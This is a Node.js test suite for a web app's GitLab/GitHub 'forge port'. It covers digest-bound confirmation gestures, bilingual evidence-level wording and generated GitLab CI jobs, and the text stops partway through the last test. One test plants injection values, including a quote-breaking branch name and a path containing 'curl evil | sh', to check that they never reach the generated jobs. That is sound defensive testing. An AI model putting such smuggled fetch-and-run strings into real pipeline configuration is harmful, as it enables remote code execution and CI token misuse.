// The shell of the forge port (ADR-0029): what the browser shows and sends for a GitLab repository, a registered
// instance, and the confirmation every forge now makes. The modules are run as the app serves them, over a page
// reduced to what they touch, with the service answered by a recorded fetch: what is held here is what leaves the
// browser (the gesture and its object, the body of each write) and what a reader meets (the sentence of a level
// before its code, the values pinned before the gesture, the jobs a GitLab project adds).
//
//   - the confirmation sends the digest the screen showed and binds the gesture to `<repository>:<digest>`; a
//     `confirmation-stale` reads the access view again and shows the new values;
//   - the four levels are said in both languages, the English ones word for word the decision's table, the sentence
//     first and the code after it; P4 says the service has not checked the key; every mission line shows a level;
//   - GitLab's jobs carry the exact audience, no clone, the push rule on the declared branch, the service's address,
//     and never print the token; a declared value that could end a quoted string is never written into them;
//   - every journal kind and every refusal of the forge port has its words, in both languages; every gesture the
//     shell binds is one the service knows.
import { test, after } from "node:test";
import assert from "node:assert/strict";
import { mkdtempSync, mkdirSync, writeFileSync, readFileSync, readdirSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join, dirname } from "node:path";
import { pathToFileURL } from "node:url";
import yaml from "js-yaml";
import { MODULES } from "../../src/http/assets.js";
import { FORGE } from "../../src/domain/refusals/forge.js";
import { GESTURES } from "../../src/domain/identity.js";
import { harness, founder, gesture, send } from "../helpers.js";

const WEB = new URL("../../web/", import.meta.url).pathname;
const VIEWS = new URL("../../node_modules/runward-fleet/ui/views.js", import.meta.url);
const ADR = new URL("../../runward/adr/", import.meta.url);
const SEND = readFileSync(new URL("../../.github/workflows/send.yml", import.meta.url), "utf8");

// ---- the page the modules expect: its elements, the listeners they set, the passkey ceremony, the service
const kept = new Map(), page = new Map(), listeners = { document: {}, main: {} };
const element = (id) => {
  const classes = new Set(), attrs = new Map();
  return {
    id, innerHTML: "", textContent: "", hidden: false, inert: false, className: "", dataset: {},
    classList: { toggle: (c, on) => (on ?? !classes.has(c) ? classes.add(c) : classes.delete(c)), contains: (c) => classes.has(c) },
    setAttribute: (k, v) => attrs.set(k, String(v)), getAttribute: (k) => attrs.get(k) ?? null,
    addEventListener: (type, f) => { if (id === "main") listeners.main[type] = f; },
    querySelectorAll: () => [], querySelector: () => null, focus() {},
  };
};
const byId = (id) => { if (!page.has(id)) page.set(id, element(id)); return page.get(id); };
globalThis.window = globalThis;
globalThis.document = {
  querySelector: () => null, querySelectorAll: () => [], getElementById: byId, title: "",
  body: { classList: { toggle() {} }, dataset: {} }, documentElement: {},
  createTreeWalker: () => ({ nextNode: () => false }),
  addEventListener: (type, f) => { listeners.document[type] = f; },
};
globalThis.localStorage = { getItem: (k) => (kept.has(k) ? kept.get(k) : null), setItem: (k, v) => kept.set(k, String(v)), removeItem: (k) => kept.delete(k) };
globalThis.location = { host: "app.runward.dev", hash: "#/" };
globalThis.matchMedia = () => ({ matches: true, addEventListener() {} });
globalThis.CSS = { escape: (s) => s };
globalThis.PublicKeyCredential = Object.assign(function PublicKeyCredential() {}, { parseRequestOptionsFromJSON: (o) => o });
Object.defineProperty(globalThis, "navigator", { configurable: true, value: { onLine: true, credentials: { get: async () => ({ toJSON: () => ({ id: "credential" }) }) } } });

/** The service, answered by the test: every call is recorded; `answers` gives the body (and status) of a path. */
const calls = [];
let answers = {};
globalThis.fetch = async (path, init = {}) => {
  const body = init.body === undefined ? undefined : JSON.parse(init.body);
  calls.push({ method: init.method, path, body });
  const given = Object.hasOwn(answers, `${init.method} ${path}`) ? answers[`${init.method} ${path}`] : null;
  const a = typeof given === "function" ? given(body) : given;
  const status = a?.status ?? 200;
  // unless a case answers otherwise: a passkey verification that holds, the session and the reads of a screen
  const reads = { "/api/v0/session": () => SESSION, "/api/v0/access": () => access(), "/api/v0/fleet/status": () => STATUS };
  const data = a?.body ?? (path.endsWith("/options") ? { options: {}, challengeId: "challenge" } : path === "/api/v0/auth/fresh" ? { until: "2026-11-11T12:00:00.000Z" } : Object.hasOwn(reads, path) ? reads[path]() : {});
  if (!a && path.startsWith("/f/")) return { ok: false, status: 404, headers: { get: () => null }, json: async () => ({ refusal: "not-found" }) };
  return { ok: status < 400, status, headers: { get: () => null }, json: async () => data };
};
const wrote = () => calls.filter((c) => !c.path.startsWith("/api/v0/auth/") && c.method !== "GET");
const gestures = () => calls.filter((c) => c.path === "/api/v0/auth/fresh/options").map((c) => c.body);

// ---- the modules as served
const served = mkdtempSync(join(tmpdir(), "rw-forge-"));
after(() => rmSync(served, { recursive: true, force: true }));
for (const f of MODULES) {
  const p = join(served, f);
  mkdirSync(dirname(p), { recursive: true });
  writeFileSync(p, readFileSync(join(WEB, f), "utf8").replace('"__VIEWS__"', JSON.stringify(VIEWS.href)));
}
const mod = (f) => import(pathToFileURL(join(served, `views/${f}.js`)).href);
const { S } = await mod("base");
const Lx = await mod("lexique");
const { niveau, niveauLigne, ordre, claimsTable, pinsTable } = await mod("claims");
const { gitlabText, snippet, RUNWARD_VERSION } = await mod("workflow");
const { KINDS, confirmBox } = await mod("confirm");
const { viewDeclarer, FIELD_OF } = await mod("declarer");
const { viewAcces } = await mod("acces");
const { viewFleet } = await mod("fleet");
const { viewDecision } = await mod("decision");
await mod("events");
const click = (what, k) => listeners.document.click({ preventDefault() {}, target: { closest: (sel) => (sel === "[data-do]" ? { dataset: { do: what, k }, hasAttribute: () => false } : null) } });
const submit = (form) => listeners.main.submit({ preventDefault() {}, target: form });
const field = (value) => ({ value });

// ---- what the service answers, written by hand in the shapes of GET /api/v0/access and GET /api/v0/fleet/status
const REG = "0123456789abcdef0123456789abcdef", KEY = "11111111-2222-4333-8444-555555555555";
const DIGEST = "d".repeat(64), THUMB = "Zm9yZ2UtcG9ydC1rZXktdGh1bWJwcmludC1yZmM3NjM4";
const repo = (over) => ({ id: "r-1", name: "group/project", workflow: ".gitlab-ci.yml", defaultBranch: "main", state: "pinned", consent: true, missions: [{ id: "demo", path: "." }], repositoryId: "42", ownerId: "7", pendingSend: null, pending: null, ...over });
const GITHUB = repo({ id: "r-gh", name: "stranxik/demo", workflow: ".github/workflows/runward.yml", forge: "github", level: "P1", repositoryId: "7002", ownerId: "2002" });
const COM = repo({ id: "r-com", forge: "gitlab", level: "P3", issuer: { kind: "public", issuer: "https://gitlab.com" }, audience: "https://app.runward.dev", protectionRequired: true, definitionRef: "gitlab.com/group/project//.gitlab-ci.yml@refs/heads/main", definitionPinned: true });
const SELF = repo({ id: "r-self", name: "team/app", forge: "gitlab", level: "P4", issuer: { kind: "registered", id: REG, issuer: "https://gitlab.example.test" }, audience: `https://app.runward.dev/send/${REG}`, protectionRequired: true, definitionRef: "gitlab.example.test/team/app//.gitlab-ci.yml@refs/heads/main", definitionPinned: true });
const key = (over) => ({ id: KEY, kid: THUMB, thumbprint: THUMB, state: "live", addedAt: "2026-11-01T10:00:00.000Z", confirmedAt: "2026-11-01T10:00:00.000Z", retiredAt: null, expiresAt: "2027-11-01T10:00:00.000Z", expiresSoon: false, ...over });
const ISSUER = { id: REG, forge: "gitlab", issuer: "https://gitlab.example.test", audience: `https://app.runward.dev/send/${REG}`, addedAt: "2026-11-01T10:00:00.000Z", receiving: true, keys: [key()] };
const access = (over = {}) => ({ passkeys: [], sessions: [], sameProvider: false, repositories: [GITHUB, COM, SELF], issuers: [ISSUER], limits: { issuers: 5, liveKeys: 4 }, gitlabCom: true, reader: null, recovery: null, lang: "fr", retention: { removedRepositoryDays: 30, backupDays: 7, archiveHours: 24 }, ...over });
const SESSION = { member: { id: "m", role: "owner" }, tenant: { id: "t", title: "runward hébergé", lang: "fr" }, passkeys: 2, arrivalDone: true, arrivalOpen: true, sendWorkflow: ["5b0c9e2d41aa7f3e9c18d6b2a07e4f51c3d9a8e0"] };
const line = (mission, repository, forge, level, over = {}) => ({ mission, repository, path: ".", state: "pinned", consent: true, forge, level, orderSignal: null, accepted: null, notAcceptedSince: 0, lastRefusal: null, lastRefusalSeq: null, lastRefusalAt: null, activity: [], ...over });
const LEVEL = (code, over = {}) => ({ code, reached: true, issuer: code === "P4" ? "registered" : "public", kid: code === "P1" ? null : THUMB, thumbprint: code === "P1" ? null : THUMB, protectionRequired: code === "P1" ? null : code !== "P3b", ...over });
const SIGNAL = { repository: "r-self", epoch: 0, current: { pipelineId: "900", jobId: "9001", issuedAt: "2026-11-10T10:00:00.000Z" }, later: { pipelineId: "12", jobId: "120", issuedAt: "2026-11-11T09:00:00.000Z" } };
const LINES = [
  line("github-app", "stranxik/demo", "github", LEVEL("P1")),
  line("demo", "group/project", "gitlab", LEVEL("P3")),
  line("lifted", "group/lifted", "gitlab", LEVEL("P3b", { reached: false, kid: null, thumbprint: null })),
  line("self", "team/app", "gitlab", LEVEL("P4", { keyRetiredAt: "2026-11-09T08:00:00.000Z" }), { orderSignal: SIGNAL, accepted: { entry: "e", seq: 9, runId: "900", runNumber: "900", runAttempt: "9001", commit: "1445c1bb17ed487793419fe073f1afd1c5308c41", receivedAt: "2026-11-10T10:01:00.000Z", kind: "check", workflow: ".gitlab-ci.yml" } }),
];
const STATUS = { lines: LINES, quarantined: 0, head: { seq: 9, hash: "h" }, recent: [], index: null };

// ---- a tenant of the real application: one GitHub repository, its first upload kept, then confirmed by the gesture
// and the body the shell itself made (below); its index and its status are the ones the reading is painted from
const REAL = { h: harness(), name: "stranxik/runward-hosted", mission: "runward-hosted" };
REAL.f = await founder(REAL.h);
REAL.session = () => REAL.h.app.identity.sessionFrom(REAL.f.token);
const json = (x) => JSON.parse(JSON.stringify(x));
await gesture(REAL.h, REAL.f.session, "declare-with-consent", REAL.name);
REAL.declared = await REAL.h.app.repositories.declare(await REAL.session(), { name: REAL.name, consent: true, missions: [{ id: REAL.mission, path: "." }] }, {});
await send(REAL.h, { repository: REAL.name, repository_id: "7002", run_id: "42830000011", run_number: "11", sha: "a4ede1485323293609957a700aba13ddf99de27f" }, { mission: REAL.mission, bytes: readFileSync(new URL("../fixtures/decision/hosted-proposed.check.json", import.meta.url)) });
REAL.pending = json(await REAL.h.app.identity.accessView(await REAL.session()));

function state({ lang = "en", ...over } = {}) {
  kept.set("rw-accueil-lang", lang);
  calls.length = 0; answers = {};
  Object.assign(S, { session: SESSION, access: access(), status: STATUS, index: null, journal: null, fleetError: null, accessError: null, journalError: null, error: null, confirming: null, busy: null, failed: null, failedText: null, stale: null, formError: null, formValues: null, issuer: null, freshUntil: 0, ...over });
}
const text = (html) => String(html).replace(/<[^>]+>/g, " ").replace(/&#39;/g, "'").replace(/&quot;/g, '"').replace(/&nbsp;/g, " ").replace(/&amp;/g, "&").replace(/\s+/g, " ");

// ------------------------------------------------------------------ the confirmation, for every forge
test("the gesture and the body the shell makes are the ones the service accepts: a real pending upload, confirmed with them", async () => {
  const r = REAL.pending.repositories.find((x) => x.id === REAL.declared.id);
  assert.ok(r.pendingSend && r.pending?.digest && r.pending.confirmable, "the access view carries what the confirmation pins");
  state({ access: REAL.pending });
  const shown = viewDeclarer(`confirmer/${r.id}`).html;
  for (const v of Object.values(r.pending.values)) assert.ok(shown.includes(`<code translate="no">${v}</code>`), `${v} is shown before the gesture`);
  await click("gesture", `confirm:${r.id}`);
  const [g] = gestures(), [w] = wrote();
  assert.equal(w.path, `/api/v0/repositories/${r.id}/confirm`);
  // the service, given exactly what the browser sent
  await gesture(REAL.h, REAL.f.session, g.gesture, g.object);
  await REAL.h.app.repositories.confirm(await REAL.session(), r.id, w.body, {});
  const s = await REAL.session();
  REAL.index = JSON.parse((await REAL.h.app.reading.index(s.tenantId)).bytes.toString("utf8"));
  REAL.status = json(await REAL.h.app.reading.status(s));
  assert.equal(json(await REAL.h.app.identity.accessView(s)).repositories[0].state, "pinned");
  // planted control: the old object, the repository's id alone, is refused by the service
  await gesture(REAL.h, REAL.f.session, "repository-confirm", r.id);
  await assert.rejects(() => REAL.h.app.repositories.confirm(s, r.id, {}, {}));
});

test("the confirmation shows the values it pins, sends their digest, and binds the gesture to <repository>:<digest>", async () => {
  for (const [r, values] of [
    [{ ...GITHUB, state: "pending", pendingSend: { claims: { repository: "stranxik/demo", repositoryId: "7002", repositoryOwnerId: "2002", runNumber: "1", runAttempt: "1" } } }, { forge: "github", repositoryId: "7002", ownerId: "2002" }],
    [{ ...SELF, state: "pending", pendingSend: { claims: { repository: "team/app", repositoryId: "42", repositoryOwnerId: "7", definitionRef: SELF.definitionRef, pipelineId: "30", jobId: "300" } } }, { forge: "gitlab", issuerKey: REG, projectId: "42", namespaceId: "7", projectPath: "team/app", definitionRef: SELF.definitionRef }],
  ]) {
    state({ access: access({ repositories: [{ ...r, pending: { values, digest: DIGEST, confirmable: true } }] }) });
    const shown = viewDeclarer(`confirmer/${r.id}`).html;
    // the screen shows each value before the gesture, and the button that makes it
    for (const v of Object.values(values)) assert.ok(shown.includes(`<code translate="no">${v}</code>`), `${r.forge}: ${v} is shown`);
    assert.ok(shown.includes(`data-do="gesture" data-k="confirm:${r.id}"`), "the confirm button");
    if (r.forge === "gitlab") assert.ok(shown.includes("registered instance <span translate=\"no\">https://gitlab.example.test</span>"), "the registration is named by its issuer");
    await click("gesture", `confirm:${r.id}`);
    assert.deepEqual(gestures(), [{ gesture: "repository-confirm", object: `${r.id}:${DIGEST}` }], "the gesture is bound to the repository and the digest shown");
    assert.deepEqual(wrote(), [{ method: "POST", path: `/api/v0/repositories/${r.id}/confirm`, body: { digest: DIGEST } }], "the body carries the digest the member saw");
  }
});

test("confirmation-stale: the access view is read again and the screen shows the new values, with the reason", async () => {
  const pendingSend = { claims: { repository: "team/app", repositoryId: "42", repositoryOwnerId: "7", definitionRef: SELF.definitionRef, pipelineId: "30", jobId: "300" } };
  const before = { ...SELF, state: "pending", pendingSend, pending: { values: { forge: "gitlab", issuerKey: REG, projectId: "42", namespaceId: "7", projectPath: "team/app", definitionRef: SELF.definitionRef }, digest: DIGEST, confirmable: true } };
  const now = { ...before, pending: { values: { ...before.pending.values, namespaceId: "8" }, digest: "e".repeat(64), confirmable: true } };
  state({ access: access({ repositories: [before] }) });
  answers = {
    "POST /api/v0/repositories/r-self/confirm": { status: 409, body: { refusal: "confirmation-stale", message: "The values to pin are no longer the ones shown.", action: "Read the new values, then confirm." } },
    "GET /api/v0/access": { body: access({ repositories: [now] }) },
  };
  await click("gesture", "confirm:r-self");
  assert.ok(calls.some((c) => c.method === "GET" && c.path === "/api/v0/access"), "the access view is read again");
  const shown = viewDeclarer("confirmer/r-self").html;
  assert.ok(shown.includes(Lx.MOTS.en.forge.pins.stale), "the screen says the values changed");
  assert.ok(shown.includes('<code translate="no">8</code>'), "and shows the new one");
  // the next gesture is bound to the new digest
  calls.length = 0; answers = {};
  await click("gesture", "confirm:r-self");
  assert.deepEqual(gestures(), [{ gesture: "repository-confirm", object: `r-self:${"e".repeat(64)}` }]);
});

test("a definition that is not the declared file on the declared branch: the values are shown with the reason, and no confirm button", () => {
  const r = { ...COM, state: "pending", workflow: "ci/main.yml", pendingSend: { claims: { repository: "group/project", definitionRef: COM.definitionRef } }, pending: { values: { forge: "gitlab", issuerKey: "https://gitlab.com", projectId: "42", namespaceId: "7", projectPath: "group/project", definitionRef: COM.definitionRef }, digest: DIGEST, confirmable: false } };
  state({ access: access({ repositories: [r] }) });
  const shown = viewDeclarer("confirmer/r-com").html;
  assert.ok(shown.includes(`<code translate="no">${COM.definitionRef}</code>`), "the definition the token names is shown");
  assert.ok(shown.includes("data-not-confirmable") && shown.includes("<code>ci/main.yml</code>"), "with the reason, and the declared file");
  assert.equal(shown.includes('data-do="gesture"'), false, "no confirm button");
  assert.ok(shown.includes('data-k="repo:r-com"'), "the declaration can still be removed");
  // a definition that changed after the confirmation: its own title, and the gesture names it
  state({ access: access({ repositories: [{ ...r, state: "pinned", workflow: ".gitlab-ci.yml", pendingSend: { reason: "definition-not-pinned", claims: r.pendingSend.claims }, pending: { ...r.pending, confirmable: true } }] }) });
  const again = viewDeclarer("confirmer/r-com");
  assert.equal(again.title, "Definition to confirm");
  assert.ok(again.html.includes(">Confirm this definition</button>"));
});

// ------------------------------------------------------------------ the levels of evidence
/** The table of ADR-0029 section 2: code -> [what the screen says the token proves, what it says is not proven]. */
function decisionTable() {
  const file = readdirSync(ADR).find((f) => f.startsWith("ADR-0029-"));
  const rows = readFileSync(new URL(file, ADR), "utf8").split("\n").filter((l) => /^\| .* \| (P1|P3|P3b|P4) \| /.test(l)).map((l) => l.split("|").map((c) => c.trim()));
  return Object.fromEntries(rows.map((c) => [c[3], [c[1], c[2]]]));
}

test("the four levels are said in both languages; the English sentences are the decision's table, word for word", () => {
  const table = decisionTable();
  assert.deepEqual(Object.keys(table), ["P1", "P3", "P3b", "P4"], "the guard must read the decision's table");
  for (const code of ["P1", "P3", "P3b", "P4"]) {
    assert.deepEqual([Lx.MOTS.en.forge.level[code].proves, Lx.MOTS.en.forge.level[code].not], table[code], `${code}: the English is the decision's`);
    for (const l of ["fr", "en"]) for (const k of ["proves", "not"]) assert.ok(Lx.MOTS[l].forge.level[code][k].length > 20, `${l} ${code}.${k}`);
    assert.notEqual(Lx.MOTS.fr.forge.level[code].proves, Lx.MOTS.en.forge.level[code].proves, `${code}: French is written`);
  }
  // never raised: P4 says the service has not checked the key, in both languages; no level speaks of the content as proven
  assert.match(Lx.MOTS.en.forge.level.P4.not, /the service has not checked that the key belongs to a GitLab instance/);
  assert.match(Lx.MOTS.fr.forge.level.P4.not, /le service n'a pas vérifié que la clé appartient à une instance GitLab/);
  for (const l of ["fr", "en"]) assert.match(Lx.MOTS[l].forge.level.lead, /ci-declared/, `${l}: the verdict stays ci-declared`);
  // planted control: a sentence changed is seen
  assert.notDeepEqual([`${Lx.MOTS.en.forge.level.P4.proves} It is a GitLab instance.`, Lx.MOTS.en.forge.level.P4.not], table.P4);
});

test("the sentence first, what it does not prove next, the code after them, in both languages; a code the page does not know is shown as written", () => {
  for (const lang of ["fr", "en"]) {
    state({ lang });
    const L = Lx.MOTS[lang].forge.level;
    for (const code of ["P1", "P3", "P3b", "P4"]) {
      const t = text(niveau(code, { state: L.reached }));
      const at = [t.indexOf(L[code].proves), t.indexOf(L[code].not), t.indexOf(L.code(code))];
      assert.ok(at[0] >= 0 && at[0] < at[1] && at[1] < at[2], `${lang} ${code}: sentence, not proven, then the code (${at})`);
      assert.equal(t.slice(0, at[0]).includes(code), false, `${lang} ${code}: the code is not said before the sentence`);
    }
    // P3b's « the line above » is P3's: it is said first
    const b = text(niveau("P3b"));
    assert.ok(b.indexOf(L.P3.not) >= 0 && b.indexOf(L.P3.not) < b.indexOf(L.P3b.not), `${lang}: P3b carries what P3 does not prove`);
    const odd = niveau("P9<x>");
    assert.ok(odd.includes("P9&lt;x&gt;") && odd.includes(L.unknown.slice(0, 20)) && !odd.includes("<x>"), `${lang}: an unknown code, escaped, and said unknown`);
  }
});

test("every mission line shows its level on the fleet's views and on its reading: reached or to come, a key since retired, the order signal with its gesture", async () => {
  state({ lang: "en" });
  const L = Lx.MOTS.en.forge.level;
  // the status line of each mission, in the relevé of the fleet's views
  const fleet = viewFleet("vue", "").html;
  for (const l of LINES) assert.ok(fleet.includes(`<span data-verbatim translate="no">${l.mission}</span>`), `${l.mission} is in the relevé of levels`);
  for (const code of ["P1", "P3", "P3b", "P4"]) assert.ok(fleet.includes(`data-level="${code}"`) && text(fleet).includes(L[code].proves), `${code} is said`);
  assert.ok(text(fleet).includes(`lifted ${L.willReach}`), "a mission with no upload yet says the level its uploads will reach");
  assert.ok(fleet.includes("pipeline <b>900</b> · job 9001"), "a GitLab upload is named by its pipeline and its job");
  // planted control: a line with no level is seen by this guard
  assert.equal(niveauLigne({ mission: "x" }), "");
  // the level of one line: what it rests on, the key since retired with its date
  const self = niveauLigne(LINES[3]);
  assert.ok(text(self).includes(L.reached) && self.includes(`<code>${THUMB}</code>`), "what the level rests on");
  assert.ok(text(self).includes("signed by a key since retired, on") && self.includes('datetime="2026-11-09T08:00:00.000Z"'), "the key since retired, with its date");
  assert.equal(niveauLigne(LINES[1]).includes("since retired"), false);
  // the order signal: both orders, and the gesture bound to the repository
  const o = ordre(LINES[3]);
  for (const v of ["900", "9001", "12", "120"]) assert.ok(o.includes(`<b>${v}</b>`), `the order shows ${v}`);
  assert.ok(o.includes('datetime="2026-11-10T10:00:00.000Z"') && o.includes('datetime="2026-11-11T09:00:00.000Z"') && text(o).includes("restored from a backup"));
  assert.ok(o.includes('data-do="ask" data-k="epoch:r-self"'));
  assert.equal(ordre(LINES[1]), "");
  S.confirming = "epoch:r-self";
  await click("confirm", "epoch:r-self");
  assert.deepEqual(gestures(), [{ gesture: "order-epoch-open", object: "r-self" }]);
  assert.deepEqual(wrote(), [{ method: "POST", path: "/api/v0/repositories/r-self/epoch", body: {} }]);
  // the application's reading: the level in its own window beside runward-fleet's reading, which is not touched
  // (the real index and the real status of the tenant confirmed above: its line carries the level the service computed)
  const m = REAL.index.missions[0];
  assert.deepEqual([REAL.status.lines[0].forge, REAL.status.lines[0].level.code, REAL.status.lines[0].level.reached], ["github", "P1", true]);
  state({ lang: "en", index: REAL.index, status: REAL.status });
  const reading = viewDecision(m.id).html;
  assert.ok(reading.includes("lecture-niveau") && text(reading).includes(L.P1.proves), "the reading shows the level");
  assert.ok(reading.indexOf("lecture-niveau") > reading.indexOf('class="lecture-d"'), "beside runward-fleet's reading, never inside it");
  const mission = viewFleet("mission", m.id).html;
  assert.ok(mission.includes('id="h-niv"') && text(mission).includes(L.P1.proves), "the mission's technical detail shows it too");
});

// ------------------------------------------------------------------ GitLab's jobs
test("GitLab's jobs: the exact audience, no clone, the push rule on the declared branch, the service's address, the token never printed", () => {
  for (const [r, origin] of [[COM, "https://app.runward.dev"], [{ ...SELF, defaultBranch: "release/2026", missions: [{ id: "app", path: "services/api" }] }, "https://app.runward.dev"]]) {
    const w = gitlabText(r), doc = yaml.load(w.text);
    assert.deepEqual(Object.keys(doc), ["runward-check", "runward-send", "runward-verdict"]);
    const send = doc["runward-send"], check = doc["runward-check"];
    // the send job is apart from the job that computes, receives its file as an artifact, and does not clone
    assert.deepEqual(send.needs, [{ job: "runward-check", artifacts: true }]);
    assert.deepEqual(send.variables, { GIT_STRATEGY: "none" });
    assert.equal(check.variables, undefined, "the job that computes does clone");
    assert.deepEqual(check.artifacts.paths, ["check.json", "runward-exit"]);
    assert.ok(/alpine/.test(send.image), "a light image");
    // the audience, exactly the access view's
    assert.deepEqual(send.id_tokens, { RUNWARD_ID_TOKEN: { aud: r.audience } });
    assert.ok(w.text.includes(`RUNWARD_ID_TOKEN: { aud: "${r.audience}" }`));
    // a push on the declared branch only
    assert.deepEqual(send.rules, [{ if: `$CI_PIPELINE_SOURCE == "push" && $CI_COMMIT_BRANCH == "${r.defaultBranch}"` }]);
    // what is sent, and where: as .github/workflows/send.yml does
    const script = send.script.join("\n");
    assert.ok(script.includes(`fetch("${origin}/api/v0/exports", { method: "POST"`), "to the service's origin, never under /send/");
    assert.ok(script.includes('authorization: "Bearer " + process.env.RUNWARD_ID_TOKEN'));
    assert.ok(script.includes(`"runward-mission": "${r.missions[0].id}", "runward-export-kind": "check"`));
    assert.ok(script.includes('"content-digest": "sha-256=:" + createHash("sha256").update(bytes).digest("base64") + ":"'));
    assert.ok(script.includes("[0, 2000, 8000, 30000]") && script.includes("r.status < 500 && r.status !== 429"), "four attempts; a named refusal is never tried again");
    for (const same of ["[0, 2000, 8000, 30000]", "r.status < 500 && r.status !== 429", '"runward-export-kind": "check"', "kept, awaiting confirmation in the app"]) assert.ok(SEND.includes(same), `send.yml does the same: ${same}`);
    // the token is named twice, where GitLab issues it and in the header; never printed, never in a command line
    assert.equal(w.text.split("RUNWARD_ID_TOKEN").length - 1, 2);
    for (const l of w.text.split("\n").filter((x) => /console\.log|echo|printf|curl|set -x/.test(x))) assert.equal(/RUNWARD_ID_TOKEN|headers|authorization/.test(l), false, `the token is not printed: ${l}`);
    assert.equal(/process\.exit\([1-9]/.test(script), false, "an upload that fails never fails the pipeline");
    // runward's verdict: computed at the mission's path, its exit code kept and given back by a job of its own
    assert.ok(check.script.join("\n").includes(`(cd "${r.missions[0].path}" && npx -y runward@${RUNWARD_VERSION} check --strict --json) > "$CI_PROJECT_DIR/check.json" || code=$?`));
    assert.deepEqual(doc["runward-verdict"].script, ['exit "$(cat runward-exit)"']);
    assert.deepEqual(doc["runward-verdict"].variables, { GIT_STRATEGY: "none" });
  }
  // the version is the one the product's send workflow runs by default
  assert.ok(SEND.includes(`runward-version: { type: string, default: "${RUNWARD_VERSION}"`), "RUNWARD_VERSION follows send.yml");
});

test("a declared value that could end a quoted string is never written into the jobs (planted values)", () => {
  const w = gitlabText({ ...COM, defaultBranch: 'main" || $CI_JOB_TOKEN == "', audience: 'https://app.runward.dev" }\n  evil: {', missions: [{ id: "Demo; rm", path: '."; curl evil | sh; "' }] });
  assert.deepEqual([w.branch, w.audience, w.mission], ["<branch>", "<audience>", "<mission>"]);
  for (const planted of ["CI_JOB_TOKEN", "evil", "Demo;", "| sh"]) assert.equal(w.text.includes(planted), false, planted);
  assert.ok(w.text.includes('cd "<path>"') && w.text.includes('fetch("<service>/api/v0/exports"'));
  assert.equal(gitlabText({ ...COM, missions: [{ id: "demo", path: "../up" }] }).text.includes("../up"), false, "a path that leaves the repository");
});

test("GitLab's jobs are offered, never presented as pinned, in both languages; GitHub's extract is unchanged", () => {
  for (const lang of ["fr", "en"]) {
    state({ lang });
    const G = Lx.MOTS[lang].forge.snippet, html = snippet(COM);
    assert.ok(text(html).includes(G.notPinned), `${lang}: nothing pins the jobs, and a job of the same name overrides them`);
    assert.ok(html.includes("<code>https://app.runward.dev</code>"), `${lang}: the audience, as it is written`);
    assert.equal(text(html).includes(text(Lx.MOTS[lang].workflow.about).slice(0, 40)), false, `${lang}: GitHub's words about a pinned workflow are not said of GitLab's jobs`);
    assert.equal(html.includes("github.com"), false, `${lang}: no GitHub address`);
    // the declaration's screen: the level first, then the jobs
    const pending = viewDeclarer(`attente/${COM.id}`).html;
    assert.ok(pending.indexOf('data-level="P3"') > 0 && pending.indexOf('data-level="P3"') < pending.indexOf('id="extrait"'), `${lang}: the level is said before the jobs`);
  }
  state({ lang: "en" });
  const gh = snippet(GITHUB);
  assert.ok(gh.includes("uses: stranxik/runward-hosted/.github/workflows/send.yml@5b0c9e2d41aa7f3e9c18d6b2a07e4f51c3d9a8e0") && gh.includes("https://github.com/stranxik/demo/new/main?filename="));
});

// ------------------------------------------------------------------ the declaration
const declareForm = (forge, over = {}) => ({ id: "declare", elements: { forge: field(forge), repo: field("group/project"), wf: field(".gitlab-ci.yml"), mission: field("demo"), path: field("."), branch: field("main"), content: { checked: false }, ...over } });

test("the declaration names its forge: GitHub's body is the one it was, gitlab.com and a registered instance say theirs; the level is said before", async () => {
  for (const [forge, wanted] of [["gitlab.com", { forge: "gitlab", issuer: "gitlab.com" }], [REG, { forge: "gitlab", issuer: REG }], ["github", {}]]) {
    state({ lang: "en" });
    answers = { "POST /api/v0/repositories": { status: 201, body: { id: "new" } } };
    await submit(declareForm(forge));
    assert.deepEqual(wrote()[0], { method: "POST", path: "/api/v0/repositories", body: { ...wanted, name: "group/project", workflow: ".gitlab-ci.yml", defaultBranch: "main", missions: [{ id: "demo", path: "." }], consent: false } }, forge);
  }
  // the form: the three forges, the level of the one chosen, its labels
  for (const [forge, code, label] of [["github", "P1", "Repository (owner/repository)"], ["gitlab.com", "P3", "Project (full path: group/project)"], [REG, "P4", "Pipeline definition, the file at the root of the pipeline"]]) {
    state({ lang: "en", formValues: { forge, repo: "", wf: "", mission: "", path: ".", branch: "main" } });
    const html = viewDeclarer("").html;
    assert.ok(html.includes(`value="${forge}" checked`) && html.includes(`data-level="${code}"`) && html.includes(label), forge);
    assert.ok(html.indexOf(`data-level="${code}"`) < html.indexOf('name="repo"'), "the level is said before the member declares");
    for (const v of ["github", "gitlab.com", REG]) assert.ok(html.includes(`name="forge" value="${v}"`), `the choice offers ${v}`);
  }
  // planted: while the service has not opened gitlab.com, the choice is not offered, and a kept choice falls back to GitHub
  state({ lang: "en", access: access({ gitlabCom: false }), formValues: { forge: "gitlab.com", repo: "", wf: "", mission: "", path: ".", branch: "main" } });
  const closed = viewDeclarer("").html;
  assert.ok(!closed.includes('value="gitlab.com"') && closed.includes('value="github" checked') && closed.includes(`name="forge" value="${REG}"`), "gitlab.com closed: GitHub and the registered instances only");
  // a refusal of the forge port lands on its field
  assert.deepEqual([FIELD_OF["issuer-unknown"], FIELD_OF["repository-path-unsupported"], FIELD_OF["repository-malformed"], FIELD_OF["workflow-malformed"]], ["forge", "repo", "repo", "wf"]);
  // choosing a forge paints the form again with its default definition file
  state({ lang: "en" });
  listeners.main.change({ target: { name: "forge", value: "gitlab.com", closest: () => declareForm("gitlab.com", { wf: field(".github/workflows/runward.yml") }) } });
  assert.deepEqual([S.formValues.forge, S.formValues.wf], ["gitlab.com", ".gitlab-ci.yml"]);
});

// ------------------------------------------------------------------ the registered instances
test("registering an instance: the key set is sent as JSON, the service's answer is shown, the gesture is bound to its digest", async () => {
  const JWKS = { keys: [{ kty: "RSA", kid: THUMB, n: "n", e: "AQAB" }] };
  const form = (keys, id = "") => ({ id: "issuer", dataset: { id }, elements: { issuer: field(" https://gitlab.example.test "), keys: field(keys), kid: field(THUMB) } });
  // not JSON: said locally, nothing sent
  state({ lang: "en" });
  await submit(form("not json"));
  assert.deepEqual(calls, []);
  assert.ok(viewAcces("instance").html.includes(Lx.MOTS.en.forge.instance.notJson));
  // the preview, then what the screen shows
  state({ lang: "en" });
  const preview = { issuer: "https://gitlab.example.test", kid: THUMB, thumbprint: THUMB, bits: 2048, digest: DIGEST };
